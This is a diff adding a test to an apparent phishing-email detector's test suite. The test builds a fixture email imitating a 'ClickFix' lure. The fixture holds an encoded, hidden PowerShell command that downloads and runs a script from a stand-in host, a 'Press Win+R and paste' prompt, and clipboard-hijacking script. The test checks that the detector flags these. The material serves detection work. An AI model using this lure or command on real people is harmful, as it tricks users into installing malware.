@@ -1,10 +1,40 @@
+import base64
+from email.message import EmailMessage
+from email.policy import SMTP
+
 from extract_features import (
     extract_urls,
     detect_urgency_keywords,
     get_attachment_risk,
     count_special_chars,
     check_mismatched_urls,
+    extract_features_from_eml,
 )
+
+
+def _write_clickfix_eml(path):
+    raw = ("IEX (New-Object Net.WebClient).DownloadString("
+           "'http://clickfix.example.com/p.ps1')")
+    b64 = base64.b64encode(raw.encode("utf-16-le")).decode("ascii")
+    command = "powershell -w hidden -enc " + b64
+    html = (
+        "<html><body><h3>Verify you are human</h3>"
+        "<p>Press Win+R and paste the command:</p>"
+        "<pre>" + command + "</pre>"
+        "<script>navigator.clipboard.writeText('" + command + "');</script>"
+        "</body></html>"
+    )
+    msg = EmailMessage(policy=SMTP)
+    msg["Subject"] = "Verificacion obligatoria"
+    msg["From"] = "security@clickfix.example.com"
+    msg["To"] = "user@example.com"
+    msg["Message-ID"] = "<clickfix-test@example.com>"
+    msg["Date"] = "Mon, 01 Jan 2024 00:00:00 +0000"
+    msg["MIME-Version"] = "1.0"
+    msg.set_content("Verifica que eres humano. Pega el comando en PowerShell.")
+    msg.add_alternative(html, subtype="html")
+    with open(path, "wb") as f:
+        f.write(msg.as_bytes())
 
 
 class TestURLExtraction:
@@ -74,3 +104,20 @@ class TestMismatchedUrls:
 
     def test_empty_html(self):
         assert check_mismatched_urls("") == 0
+
+
+class TestClickFixIntegration:
+    def test_clickfix_features_and_metadata(self, tmp_path):
+        eml = tmp_path / "clickfix.eml"
+        _write_clickfix_eml(eml)
+
+        features, metadata = extract_features_from_eml(str(eml))
+
+        assert features["clanker_clickfix_detected"] == 1
+        assert features["clanker_clickfix_payload_url_count"] >= 1
+        assert features["clanker_clickfix_has_encoded_command"] == 1
+
+        clickfix = metadata.get("clickfix") or {}
+        assert clickfix.get("clickfix_detected") is True
+        assert clickfix.get("high_confidence") is True
+        assert "http://clickfix.example.com/p.ps1" in clickfix["payload_urls"]
